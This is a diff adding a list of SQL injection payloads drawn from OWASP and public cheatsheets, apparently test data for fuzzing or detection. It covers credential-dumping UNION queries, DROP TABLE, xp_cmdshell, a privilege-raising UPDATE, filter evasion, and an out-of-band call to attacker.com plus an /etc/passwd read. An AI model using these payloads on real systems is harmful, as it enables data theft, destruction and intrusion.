@@ -1,0 +1,59 @@
+# SQL Injection Attack Payloads
+# ==============================
+# 格式：每行一个 payload，# 开头为注释
+# 来源：OWASP Testing Guide + 公开 SQLi cheatsheet
+
+# === 经典注入 ===
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+1; DROP TABLE users--
+'; DROP TABLE users; --
+1) OR (1=1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# === UNION-based 数据外泄 ===
+1 UNION SELECT username,password FROM users--
+1 UNION ALL SELECT NULL,table_name FROM information_schema.tables--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--
+
+# === 盲注（Boolean-based）===
+1 AND 1=1
+1 AND 1=2
+1' AND SUBSTRING(username,1,1)='a'--
+1 AND (SELECT COUNT(*) FROM users) > 0
+
+# === 时间盲注 ===
+1; WAITFOR DELAY '0:0:5'--
+1 AND SLEEP(5)
+1' AND SLEEP(5)--
+1; SELECT BENCHMARK(5000000, MD5('test'))--
+
+# === 编码绕过 ===
+%27 OR %271%27=%271
+' OR 0x313d31--
+1 OR 0b1=0b1
+\' OR \'1\'=\'1
+
+# === 混合大小写 ===
+SeLeCt * FrOm uSeRs WhErE 1=1
+UnIoN sElEcT uSeRnAmE,pAsSwOrD fRoM aDmInS
+
+# === 注释绕过 ===
+DR/**/OP/**/TABLE/**/users
+SEL/**/ECT * FR/**/OM users
+
+# === 堆叠查询 ===
+1; EXEC xp_cmdshell('whoami')--
+1; INSERT INTO users VALUES('hacker','hacked')--
+1; UPDATE users SET role='admin' WHERE username='attacker'--
+
+# === 字符串拼接 ===
+'||'SELECT'||' * '||'FROM users
+CONCAT(0x53,0x45,0x4c,0x45,0x43,0x54)
+
+# === Out-of-Band ===
+'; EXEC master..xp_dirtree '//attacker.com/share'--
+1 AND LOAD_FILE('/etc/passwd')--
